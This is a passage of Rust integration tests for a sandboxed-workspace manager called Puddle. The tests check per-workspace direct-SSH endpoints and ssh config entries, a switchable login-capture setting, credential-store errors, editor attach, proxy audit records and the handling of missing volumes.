        serde_json::from_slice(&std::fs::read(list_path(&rig)).unwrap()).unwrap();
    assert!(
        saved["workspaces"].as_array().unwrap().is_empty(),
        "{saved}"
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn the_ssh_endpoint_exists_while_the_workspace_runs_with_direct_ssh_on() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    allow_direct_ssh(&api, "acme", true).await;
    create(&api, &mut events, "acme").await;
    let name = WorkspaceName::new("acme").unwrap();
    let endpoint: PathBuf = host.workspaces().ssh_endpoint(&name).await.unwrap();
    assert_ne!(endpoint.as_os_str(), "");
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert!(host.workspaces().ssh_endpoint(&name).await.is_none());
    host.shutdown().await;
}

/// A session the runtime cannot serve ends the client's `ssh` with nothing to read, so the user
/// is told through the event stream.
#[tokio::test(flavor = "multi_thread")]
async fn an_ssh_session_the_runtime_cannot_serve_reaches_the_user_as_an_event() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    allow_direct_ssh(&api, "acme", true).await;
    create(&api, &mut events, "acme").await;
    let name = WorkspaceName::new("acme").unwrap();
    let endpoint: PathBuf = host.workspaces().ssh_endpoint(&name).await.unwrap();
    rig.runtime.inject(
        Op::ServeSsh,
        Fault::once(puddle_compute::ComputeError::Runtime {
            op: "serve ssh",
            message: "the guest's sshd is gone".into(),
        }),
    );

    let (_stdin, bridge_in) = tokio::io::duplex(1024);
    let (bridge_out, _stdout) = tokio::io::duplex(1024);
    let _ = puddle_ssh::bridge::run(&endpoint, bridge_in, bridge_out).await;

    let event = events
        .until(
            |e| e["type"] == "workspace_ssh_failed",
            Duration::from_secs(20),
        )
        .await;
    assert_eq!(event["workspace"], "acme");
    let reason = event["reason"].as_str().unwrap();
    assert!(reason.contains("the guest's sshd is gone"), "{reason}");
    host.shutdown().await;
}

async fn allow_direct_ssh(api: &Api, name: &str, on: bool) {
    let reply = api
        .put(
            &format!("/api/settings/workspaces/{name}"),
            &json!({"overrides": {"direct_ssh": on}}).to_string(),
        )
        .await;
    assert_eq!(reply.status, 200, "{}", reply.body);
}

#[tokio::test(flavor = "multi_thread")]
async fn with_direct_ssh_off_there_is_no_ssh_endpoint_and_the_gate_says_no() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let name = WorkspaceName::new("acme").unwrap();
    assert_eq!(
        api.get("/api/workspaces/acme").await.json()["status"],
        "running"
    );
    assert!(
        host.workspaces().ssh_endpoint(&name).await.is_none(),
        "no endpoint while the switch is off"
    );
    assert!(
        !host.workspaces().direct_ssh_allowed(&name),
        "the gate says no, so nothing else may open a way in"
    );
    assert_eq!(
        api.get("/api/workspaces/acme").await.json()["direct_ssh"],
        false
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn turning_direct_ssh_on_and_off_opens_and_closes_the_endpoint_at_once() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let name = WorkspaceName::new("acme").unwrap();

    allow_direct_ssh(&api, "acme", true).await;
    assert!(host.workspaces().direct_ssh_allowed(&name));
    host.workspaces()
        .ssh_endpoint(&name)
        .await
        .expect("endpoint opens live");
    assert_eq!(
        api.get("/api/workspaces/acme").await.json()["direct_ssh"],
        true
    );

    allow_direct_ssh(&api, "acme", false).await;
    assert!(
        host.workspaces().ssh_endpoint(&name).await.is_none(),
        "endpoint closes live"
    );
    assert_eq!(
        api.get("/api/workspaces/acme").await.json()["direct_ssh"],
        false
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn login_capture_is_on_by_default_and_a_workspace_can_turn_it_off_for_its_next_start() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    create(&api, &mut events, "beta").await;
    // On by default: both decrypt the hosts of the Claude Code and GitHub logins and read their
    // token exchanges.
    for workspace in ["acme", "beta"] {
        for site in [
            "platform.claude.com",
            "api.anthropic.com",
            "github.com",
            "api.github.com",
        ] {
            assert!(decrypts(&host, workspace, site), "{workspace} {site}");
        }
        assert!(
            host.workspaces()
                .termination(&name(workspace))
                .unwrap()
                .exchanges()
                .is_some()
        );
    }

    // acme turns it off: it applies at its next start, and beta is not touched.
    let reply = api
        .put(
            "/api/settings/workspaces/acme",
            &json!({"overrides": {"capture_logins": false}}).to_string(),
        )
        .await;
    assert_eq!(reply.status, 200, "{}", reply.body);
    assert!(
        decrypts(&host, "acme", "platform.claude.com"),
        "applies at the next start"
    );
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    api.post("/api/workspaces/acme/start", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    for site in ["platform.claude.com", "api.anthropic.com", "api.github.com"] {
        assert!(!decrypts(&host, "acme", site), "{site}");
    }
    assert!(decrypts(&host, "beta", "platform.claude.com"));

    // The global default decides for a workspace with no switch of its own.
    let reply = api
        .put(
            "/api/settings",
            &json!({"workspace_defaults": {"capture_logins": false}}).to_string(),
        )
        .await;
    assert_eq!(reply.status, 200, "{}", reply.body);
    api.post("/api/workspaces/beta/stop", "").await;
    events.until(ended("beta"), Duration::from_secs(20)).await;
    api.post("/api/workspaces/beta/start", "").await;
    events.until(ended("beta"), Duration::from_secs(20)).await;
    assert!(!decrypts(&host, "beta", "platform.claude.com"));
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_kept_login_is_forgotten_through_the_api_by_the_services_short_name() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    // Nothing is kept, which is fine to forget again; the service must be one Puddle has.
    let gone = api.delete("/api/workspaces/acme/logins/claude", None).await;
    assert_eq!(gone.status, 204, "{}", gone.body);
    // A credential store that refuses the deletion is a 503, and works again once it answers.
    rig.secrets.break_it();
    let refused = api.delete("/api/workspaces/acme/logins/claude", None).await;
    assert_eq!(refused.status, 503, "{}", refused.body);
    assert!(refused.body.contains("ask again"), "{}", refused.body);
    rig.secrets.heal();
    let again = api.delete("/api/workspaces/acme/logins/claude", None).await;
    assert_eq!(again.status, 204, "{}", again.body);
    let unknown = api.delete("/api/workspaces/acme/logins/azure", None).await;
    assert_eq!(unknown.status, 404, "{}", unknown.body);
    let no_workspace = api
        .delete("/api/workspaces/nobody/logins/claude", None)
        .await;
    assert_eq!(no_workspace.status, 404, "{}", no_workspace.body);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn the_kept_logins_list_says_nothing_is_kept_and_does_not_wait_on_the_credential_store() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let listed = api.get("/api/workspaces/acme/logins").await;
    assert_eq!(listed.status, 200, "{}", listed.body);
    let listed: serde_json::Value = serde_json::from_str(&listed.body).unwrap();
    assert_eq!(listed, json!({"logins": [], "store_readable": true}));
    // Puddle's own record answers now, so a store that is locked or gone does not stall the list.
    rig.secrets.break_it();
    let down = api.get("/api/workspaces/acme/logins").await;
    assert_eq!(down.status, 200, "{}", down.body);
    let down: serde_json::Value = serde_json::from_str(&down.body).unwrap();
    assert_eq!(down, json!({"logins": [], "store_readable": true}));
    let no_workspace = api.get("/api/workspaces/nobody/logins").await;
    assert_eq!(no_workspace.status, 404, "{}", no_workspace.body);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn the_global_default_decides_for_workspaces_without_their_own_switch() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    let reply = api
        .put(
            "/api/settings",
            &json!({"workspace_defaults": {"direct_ssh": true}}).to_string(),
        )
        .await;
    assert_eq!(reply.status, 200, "{}", reply.body);
    create(&api, &mut events, "acme").await;
    let name = WorkspaceName::new("acme").unwrap();
    assert!(host.workspaces().ssh_endpoint(&name).await.is_some());
    // Its own switch wins over the default.
    allow_direct_ssh(&api, "acme", false).await;
    assert!(host.workspaces().ssh_endpoint(&name).await.is_none());
    host.shutdown().await;
}

/// The line Puddle adds to the user's ssh config. On Windows the product writes the path with
/// forward slashes (OpenSSH accepts them, and a backslash is an escape for some parsers).
fn include_line(path: &std::path::Path) -> String {
    let text = path.display().to_string();
    let text = if cfg!(windows) {
        text.replace('\\', "/")
    } else {
        text
    };
    format!("Include \"{text}\"")
}

/// The `Host` lines of Puddle's ssh config file (none when there is no file).
fn ssh_hosts(rig: &Rig) -> Vec<String> {
    std::fs::read_to_string(rig.puddle_ssh_config())
        .unwrap_or_default()
        .lines()
        .filter_map(|l| l.strip_prefix("Host ").map(str::to_owned))
        .collect()
}

#[tokio::test(flavor = "multi_thread")]
async fn the_runtime_gets_the_login_key_and_the_ssh_entry_follows_the_endpoint() {
    let rig = Rig::new();
    let factory = FakeFactory::new(&rig.runtime, &rig.log);
    let prepared = prepare(rig.config(), &FakePlatform::new(&rig.log)).unwrap();
    let mut options = hermetic_options();
    options.secret_store = Some(rig.secrets.clone());
    options.dev_cert = Some(rig.dev_cert.clone() as Arc<dyn DevCertSource>);
    let host = Host::start(prepared, &factory, options).await.unwrap();
    let key = factory.ssh_login_key.lock().unwrap().clone().unwrap();
    let public =
        std::fs::read_to_string(rig.dir.path().join("data/ssh/login_ed25519.pub")).unwrap();
    assert_eq!(key, public.trim());
    assert!(key.starts_with("ssh-ed25519 "));

    let api = api(&host);
    let mut events = api.events().await;
    let name = WorkspaceName::new("acme").unwrap();
    // Off: no entry, and the user's own file is not touched.
    create(&api, &mut events, "acme").await;
    assert!(ssh_hosts(&rig).is_empty());
    assert!(!rig.user_ssh_config().exists());

    // On: the entry names the endpoint, and the user's file gets its one line.
    allow_direct_ssh(&api, "acme", true).await;
    let first = host.workspaces().ssh_endpoint(&name).await.unwrap();
    assert_eq!(ssh_hosts(&rig), ["puddle-acme"]);
    let entry = std::fs::read_to_string(rig.puddle_ssh_config()).unwrap();
    assert!(entry.contains(&first.display().to_string()), "{entry}");
    assert!(entry.contains("ssh-bridge"), "{entry}");
    let include = include_line(&rig.puddle_ssh_config());
    let user = std::fs::read_to_string(rig.user_ssh_config()).unwrap();
    assert_eq!(user.lines().next(), Some(include.as_str()), "{user}");

    // Off again: the entry goes with the endpoint, the include line stays (and is not doubled).
    allow_direct_ssh(&api, "acme", false).await;
    assert!(ssh_hosts(&rig).is_empty());
    allow_direct_ssh(&api, "acme", true).await;
    assert_eq!(ssh_hosts(&rig), ["puddle-acme"]);
    assert_eq!(
        std::fs::read_to_string(rig.user_ssh_config()).unwrap(),
        user
    );

    // A stop takes the entry out; the next start writes the new endpoint (the name is random per run).
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert!(ssh_hosts(&rig).is_empty());
    api.post("/api/workspaces/acme/start", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let second = host.workspaces().ssh_endpoint(&name).await.unwrap();
    assert_ne!(first, second);
    let entry = std::fs::read_to_string(rig.puddle_ssh_config()).unwrap();
    assert!(
        entry.contains(&second.display().to_string())
            && !entry.contains(&first.display().to_string())
    );

    // Shutting down leaves no entry.
    host.shutdown().await;
    assert!(ssh_hosts(&rig).is_empty());
}

#[tokio::test(flavor = "multi_thread")]
async fn a_workspace_that_follows_the_global_default_gets_its_entry_and_one_that_overrides_it_does_not()
 {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    let reply = api
        .put(
            "/api/settings",
            &json!({"workspace_defaults": {"direct_ssh": true}}).to_string(),
        )
        .await;
    assert_eq!(reply.status, 200, "{}", reply.body);
    create(&api, &mut events, "acme").await;
    allow_direct_ssh(&api, "beta", false).await;
    create(&api, &mut events, "beta").await;
    assert_eq!(ssh_hosts(&rig), ["puddle-acme"]);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn an_entry_left_by_a_crashed_run_is_gone_when_the_host_starts() {
    let rig = Rig::new();
    let stale = rig.puddle_ssh_config();
    std::fs::create_dir_all(stale.parent().unwrap()).unwrap();
    std::fs::write(&stale, "Host puddle-ghost\n    User root\n").unwrap();
    let host = rig.start().await;
    assert!(ssh_hosts(&rig).is_empty());
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn an_entry_that_cannot_be_written_is_a_problem_that_ends_when_it_can() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    // The user's ssh config is a folder: the include line cannot be added.
    std::fs::create_dir_all(rig.user_ssh_config()).unwrap();
    allow_direct_ssh(&api, "acme", true).await;
    let (title, detail) = problem_is(&api, "ssh:acme", true).await.unwrap();
    assert!(title.contains("acme"), "{title}");
    assert!(detail.contains("include line"), "{detail}");
    // The attach says it too, instead of opening an editor that cannot connect.
    let attach = api
        .post(
            "/api/workspaces/acme/attach",
            &json!({"mode": "desktop"}).to_string(),
        )
        .await;
    assert_eq!(attach.json()["opened"], false, "{}", attach.body);
    assert!(
        attach.json()["message"]
            .as_str()
            .unwrap()
            .contains("include line")
    );
    assert!(rig.launcher.opened.lock().unwrap().is_empty());
    // Fixed: the next attach writes it, opens the editor and the problem is gone.
    std::fs::remove_dir(rig.user_ssh_config()).unwrap();
    let attach = api
        .post(
            "/api/workspaces/acme/attach",
            &json!({"mode": "desktop"}).to_string(),
        )
        .await;
    assert_eq!(attach.json()["opened"], true, "{}", attach.body);
    assert!(problem_is(&api, "ssh:acme", false).await.is_none());
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn an_entry_that_cannot_be_taken_out_is_a_problem_until_the_file_can_be_written() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    allow_direct_ssh(&api, "acme", true).await;
    eventually("the entry", APPLY, || {
        std::fs::read_to_string(rig.puddle_ssh_config()).is_ok_and(|t| t.contains("puddle-acme"))
    })
    .await;
    // A folder with a file in it where Puddle's file is: the file cannot be rewritten.
    std::fs::remove_file(rig.puddle_ssh_config()).unwrap();
    std::fs::create_dir_all(rig.puddle_ssh_config().join("in")).unwrap();
    allow_direct_ssh(&api, "acme", false).await;
    let (title, detail) = problem_is(&api, "ssh:acme", true).await.unwrap();
    assert!(title.contains("still names acme"), "{title}");
    assert!(detail.contains("cannot take puddle-acme"), "{detail}");
    // Fixed: the next entry written for it ends the problem.
    std::fs::remove_dir_all(rig.puddle_ssh_config()).unwrap();
    allow_direct_ssh(&api, "acme", true).await;
    assert!(problem_is(&api, "ssh:acme", false).await.is_none());
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_problem_with_direct_ssh_ends_when_the_switch_goes_off_or_the_workspace_stops() {
    for ending in ["off", "stop"] {
        let rig = Rig::new();
        let host = rig.start().await;
        let api = api(&host);
        let mut events = api.events().await;
        create(&api, &mut events, "acme").await;
        std::fs::create_dir_all(rig.user_ssh_config()).unwrap();
        allow_direct_ssh(&api, "acme", true).await;
        problem_is(&api, "ssh:acme", true).await.unwrap();
        if ending == "off" {
            allow_direct_ssh(&api, "acme", false).await;
        } else {
            api.post("/api/workspaces/acme/stop", "").await;
            events.until(ended("acme"), Duration::from_secs(20)).await;
        }
        assert!(
            problem_is(&api, "ssh:acme", false).await.is_none(),
            "{ending}"
        );
        host.shutdown().await;
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn a_host_without_the_puddle_program_says_why_direct_ssh_has_no_entry() {
    let rig = Rig::new();
    let mut config = rig.config();
    config.ssh.bridge_program = None;
    let host = rig.start_with(config).await;
    let api = api(&host);
    let mut events = api.events().await;
    allow_direct_ssh(&api, "acme", true).await;
    create(&api, &mut events, "acme").await;
    let (_, detail) = problem_is(&api, "ssh:acme", true).await.unwrap();
    assert!(detail.contains("no `puddle` program"), "{detail}");
    assert!(ssh_hosts(&rig).is_empty());
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn the_desktop_editor_opens_the_start_folder_or_the_multi_root_file_on_the_workspaces_ssh_host()
 {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    allow_direct_ssh(&api, "acme", true).await;
    create(&api, &mut events, "acme").await;
    let attach = || async {
        let reply = api
            .post(
                "/api/workspaces/acme/attach",
                &json!({"mode": "desktop"}).to_string(),
            )
            .await;
        assert_eq!(reply.json()["opened"], true, "{}", reply.body);
        rig.launcher
            .targets
            .lock()
            .unwrap()
            .last()
            .cloned()
            .unwrap()
    };
    let root = attach().await;
    assert_eq!(root.ssh_host, "puddle-acme");
    assert_eq!(root.path, "/workspaces/acme");
    assert!(!root.is_workspace_file);

    rig.guest
        .put_checkout("api", "https://example.org/acme/api.git");
    rig.guest
        .put_checkout("web", "https://example.org/acme/web.git");
    let multi = attach().await;
    assert_eq!(
        multi.path,
        "/workspaces/acme/.puddle/editor/acme.code-workspace"
    );
    assert!(multi.is_workspace_file);

    let reply = put_start_folder(&api, "acme", Some("api")).await;
    assert_eq!(reply.status, 200, "{}", reply.body);
    let folder = attach().await;
    assert_eq!(folder.path, "/workspaces/acme/api");
    assert!(!folder.is_workspace_file);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_launcher_that_fails_says_why_in_the_answer() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    allow_direct_ssh(&api, "acme", true).await;
    create(&api, &mut events, "acme").await;
    *rig.launcher.fail_with.lock().unwrap() = Some("VS Code is not installed".into());
    let reply = api
        .post(
            "/api/workspaces/acme/attach",
            &json!({"mode": "desktop"}).to_string(),
        )
        .await;
    assert_eq!(reply.json()["opened"], false, "{}", reply.body);
    assert_eq!(reply.json()["message"], "VS Code is not installed");
    host.shutdown().await;
}

/// An endpoint that cannot open (its folder is gone) is reported as an event and a problem, the
/// attach says so, and the problem ends when the endpoint opens again.
#[cfg(unix)]
#[tokio::test(flavor = "multi_thread")]
async fn an_endpoint_that_cannot_open_is_reported_and_ends_when_it_can() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    let name = WorkspaceName::new("acme").unwrap();
    allow_direct_ssh(&api, "acme", true).await;
    create(&api, &mut events, "acme").await;
    let endpoint = host.workspaces().ssh_endpoint(&name).await.unwrap();
    let folder = endpoint.parent().unwrap().to_path_buf();
    allow_direct_ssh(&api, "acme", false).await;
    let moved = folder.with_extension("away");
    std::fs::rename(&folder, &moved).unwrap();

    allow_direct_ssh(&api, "acme", true).await;
    let (title, detail) = problem_is(&api, "ssh:acme", true).await.unwrap();
    assert!(title.contains("acme"), "{title}");
    assert!(detail.contains("no SSH endpoint"), "{detail}");
    let event = events
        .until(
            |e| e["type"] == "workspace_ssh_failed",
            Duration::from_secs(20),
        )
        .await;
    assert_eq!(event["workspace"], "acme");
    assert!(host.workspaces().ssh_endpoint(&name).await.is_none());
    assert!(ssh_hosts(&rig).is_empty());
    let attach = api
        .post(
            "/api/workspaces/acme/attach",
            &json!({"mode": "desktop"}).to_string(),
        )
        .await;
    assert_eq!(attach.json()["opened"], false, "{}", attach.body);
    assert!(
        attach.json()["message"]
            .as_str()
            .unwrap()
            .contains("no endpoint")
    );

    // The folder is back: turning the switch off and on again opens it and ends the problem.
    std::fs::rename(&moved, &folder).unwrap();
    allow_direct_ssh(&api, "acme", false).await;
    assert!(problem_is(&api, "ssh:acme", false).await.is_none());
    allow_direct_ssh(&api, "acme", true).await;
    host.workspaces().ssh_endpoint(&name).await.unwrap();
    assert_eq!(ssh_hosts(&rig), ["puddle-acme"]);
    host.shutdown().await;
}

fn base64(input: &[u8]) -> String {
    const TABLE: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::new();
    for chunk in input.chunks(3) {
        let n = chunk
            .iter()
            .enumerate()
            .fold(0_u32, |n, (i, b)| n | (u32::from(*b) << (16 - 8 * i)));
        for i in 0..4 {
            if i <= chunk.len() {
                out.push(char::from(TABLE[((n >> (18 - 6 * i)) & 63) as usize]));
            } else {
                out.push('=');
            }
        }
    }
    out
}

#[tokio::test(flavor = "multi_thread")]
async fn an_image_pull_is_audited_as_puddles_own_connection() {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let rig = Rig::new();
    let platform = FakePlatform::new(&rig.log);
    let prepared = prepare(rig.config(), &platform).unwrap();
    let factory = FakeFactory::new(&rig.runtime, &rig.log);
    let host = Host::start(prepared, &factory, hermetic_options())
        .await
        .unwrap();

    let target = tokio::net::TcpListener::bind(("127.0.0.1", 0))
        .await
        .unwrap();
    let target_port = target.local_addr().unwrap().port();
    tokio::spawn(async move {
        let _ = target.accept().await;
    });
    let url = factory.pull_url.lock().unwrap().clone().unwrap();
    let rest = url.strip_prefix("http://").unwrap();
    let (credentials, addr) = rest.split_once('@').unwrap();
    let mut stream = tokio::net::TcpStream::connect(addr).await.unwrap();
    let request = format!(
        "CONNECT 127.0.0.1:{target_port} HTTP/1.1\r\nHost: 127.0.0.1:{target_port}\r\nProxy-Authorization: Basic {}\r\n\r\n",
        base64(credentials.as_bytes())
    );
    stream.write_all(request.as_bytes()).await.unwrap();
    let mut head = [0_u8; 12];
    stream.read_exact(&mut head).await.unwrap();
    assert!(head.starts_with(b"HTTP/1.1 200"), "{head:?}");
    drop(stream);

    let deadline = std::time::Instant::now() + Duration::from_secs(5);
    loop {
        let records: Vec<serde_json::Value> = host
            .store()
            .audit_lines(0, 1000)
            .unwrap()
            .into_iter()
            .filter_map(|(_, line)| serde_json::from_str(&line).ok())
            .filter(|v: &serde_json::Value| v["type"] == "connection")
            .collect();
        if let Some(record) = records.first() {
            assert!(record["workspace"].is_null(), "{record}");
            assert_eq!(record["origin"], "puddle", "{record}");
            break;
        }
        assert!(
            std::time::Instant::now() < deadline,
            "no audit record for the pull"
        );
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    host.shutdown().await;
}

/// Seeds a workspace the list names whose volume is gone, then returns the rig and its host.
async fn host_with_listed_workspace_whose_volume_is_gone() -> (Rig, Host<FakeRuntime>) {
    let rig = Rig::new();
    let host = rig.start().await;
    let api1 = api(&host);
    let mut events = api1.events().await;
    create(&api1, &mut events, "acme").await;
    host.shutdown().await;
    drop(host);
    drop(events);
    rig.runtime
        .remove_volume(&WorkspaceId::new("acme").unwrap().volume_name())
        .await
        .unwrap();
    let again = rig.start().await;
    (rig, again)
}

#[tokio::test(flavor = "multi_thread")]
async fn starting_a_workspace_whose_volume_is_gone_refuses_and_makes_no_empty_volume() {
    let (rig, host) = host_with_listed_workspace_whose_volume_is_gone().await;
    let api = api(&host);
    let mut events = api.events().await;
    api.post("/api/workspaces/acme/start", "").await;
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "failed", "{end}");
    let detail = end["detail"].as_str().unwrap();
    assert!(detail.contains("has no volume"), "{detail}");
    assert!(detail.contains("ws-acme"), "{detail}");
    assert!(detail.contains("no new empty volume"), "{detail}");
    // Nothing was made in its place.
    assert!(volume_names(&rig).await.is_empty());
    assert!(rig.runtime.list().await.unwrap().is_empty());
    // The entry stays in the list (nothing else was lost).
    assert_eq!(
        api.get("/api/workspaces").await.json()["workspaces"]
            .as_array()
            .unwrap()
            .len(),
        1
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_refused_start_for_a_missing_volume_shows_the_volume_missing_state() {
    let (_rig, host) = host_with_listed_workspace_whose_volume_is_gone().await;
    let api = api(&host);
    let mut events = api.events().await;
    api.post("/api/workspaces/acme/start", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(
        api.get("/api/workspaces/acme").await.json()["status"],
        "volume_missing"
    );
    // The state is a way to delete, and a start that finds the volume again leaves it.
    let check = api.get("/api/workspaces/acme/delete-check").await.json();
    assert_eq!(check["volume_missing"], true);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_restart_shows_a_workspace_whose_volume_is_gone_as_volume_missing_before_any_start() {
    let (rig, host) = host_with_listed_workspace_whose_volume_is_gone().await;
    let api = api(&host);
    let shown = api.get("/api/workspaces/acme").await.json();
    assert_eq!(shown["status"], "volume_missing", "{shown}");
    let listed = api.get("/api/workspaces").await.json();
    assert_eq!(
        listed["workspaces"][0]["status"], "volume_missing",
        "{listed}"
    );
    // Only the start-up reads were made: nothing was created or removed for it.
    assert!(volume_names(&rig).await.is_empty());
    // The way out is the same as after a refused start: restore the volume, then Start.
    rig.runtime
        .create_volume(puddle_compute::VolumeSpec {
            name: WorkspaceId::new("acme").unwrap().volume_name(),
            size: puddle_compute::DiskSize::mib(1024),
        })
        .await
        .unwrap();
    let mut events = api.events().await;
    api.post("/api/workspaces/acme/start", "").await;
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "done", "{end}");
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_restart_keeps_a_workspace_with_its_volume_stopped() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api1 = api(&host);
    let mut events = api1.events().await;
    create(&api1, &mut events, "acme").await;
    host.shutdown().await;
    drop(host);
    drop(events);
    let again = rig.start().await;
    let shown = api(&again).get("/api/workspaces/acme").await.json();
    assert_ne!(shown["status"], "volume_missing", "{shown}");
    again.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_workspace_whose_volume_is_gone_can_be_deleted_without_a_check_in_a_sandbox() {
    let (rig, host) = host_with_listed_workspace_whose_volume_is_gone().await;
    let api = api(&host);
    let mut events = api.events().await;
    let check = api.get("/api/workspaces/acme/delete-check").await.json();
    assert_eq!(check["volume_missing"], true, "{check}");
    assert_eq!(check["clean"], true, "{check}");
    let seen =
        json!({"confirm": true, "fingerprint": check["fingerprint"].as_str().unwrap()}).to_string();
    let accepted = api.delete("/api/workspaces/acme", Some(&seen)).await;
    assert_eq!(accepted.status, 202, "{}", accepted.body);
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "done", "{end}");
    assert!(
        api.get("/api/workspaces").await.json()["workspaces"]
            .as_array()
            .unwrap()
            .is_empty()
    );
    assert!(rig.runtime.list().await.unwrap().is_empty());
    assert!(volume_names(&rig).await.is_empty());
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn deleting_a_workspace_with_no_volume_also_removes_the_sandbox_the_restart_kept() {
    let (rig, host) = host_with_listed_workspace_whose_volume_is_gone().await;
    // The restart kept the stopped sandbox record.
    assert_eq!(rig.runtime.list().await.unwrap().len(), 1);
    let api = api(&host);
    let mut events = api.events().await;
    let check = api.get("/api/workspaces/acme/delete-check").await.json();
    let seen = json!({"confirm": true, "fingerprint": check["fingerprint"]}).to_string();
    let accepted = api.delete("/api/workspaces/acme", Some(&seen)).await;
    assert_eq!(accepted.status, 202, "{}", accepted.body);
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "done", "{end}");
    assert!(rig.runtime.list().await.unwrap().is_empty());
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_restored_volume_lets_a_volume_missing_workspace_start() {
    let (rig, host) = host_with_listed_workspace_whose_volume_is_gone().await;
    let api = api(&host);
    let mut events = api.events().await;
    api.post("/api/workspaces/acme/start", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    rig.runtime
        .create_volume(puddle_compute::VolumeSpec {
            name: WorkspaceId::new("acme").unwrap().volume_name(),
            size: puddle_compute::DiskSize::mib(1024),
        })
        .await
        .unwrap();
    api.post("/api/workspaces/acme/start", "").await;
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "done", "{end}");
    assert_eq!(
        api.get("/api/workspaces/acme").await.json()["status"],
        "running"
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn creating_a_workspace_named_like_a_kept_volume_is_refused_and_leaves_it_alone() {
    let rig = Rig::new();
    rig.runtime
        .create_volume(puddle_compute::VolumeSpec {
            name: WorkspaceId::new("lost").unwrap().volume_name(),
            size: puddle_compute::DiskSize::mib(1024),
        })
        .await
        .unwrap();
    let host = rig.start().await;
    let api = api(&host);

    let reply = api.post("/api/workspaces", &new_workspace("lost")).await;
    assert_eq!(reply.status, 409, "{}", reply.body);
    let message = reply.json()["message"].as_str().unwrap().to_owned();
    assert!(message.contains("ws-lost"), "{message}");
    assert!(message.contains("may hold"), "{message}");
    assert!(message.contains("another name"), "{message}");
    // Nothing was made or removed, and no list entry exists.
    assert_eq!(volume_names(&rig).await, ["ws-lost"]);
    assert!(rig.runtime.list().await.unwrap().is_empty());
    assert!(
        api.get("/api/workspaces").await.json()["workspaces"]
            .as_array()
            .unwrap()
            .is_empty()
    );
    // Another name still works.
    let mut events = api.events().await;
    create(&api, &mut events, "other").await;
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_sandbox_record_the_list_does_not_name_is_removed_and_reported_but_its_volume_stays() {
    let rig = Rig::new();
    rig.runtime
        .create_volume(puddle_compute::VolumeSpec {
            name: WorkspaceId::new("lost").unwrap().volume_name(),
            size: puddle_compute::DiskSize::mib(1024),
        })
        .await
        .unwrap();
    let ghost = SandboxName::new("ghost").unwrap();
    rig.runtime
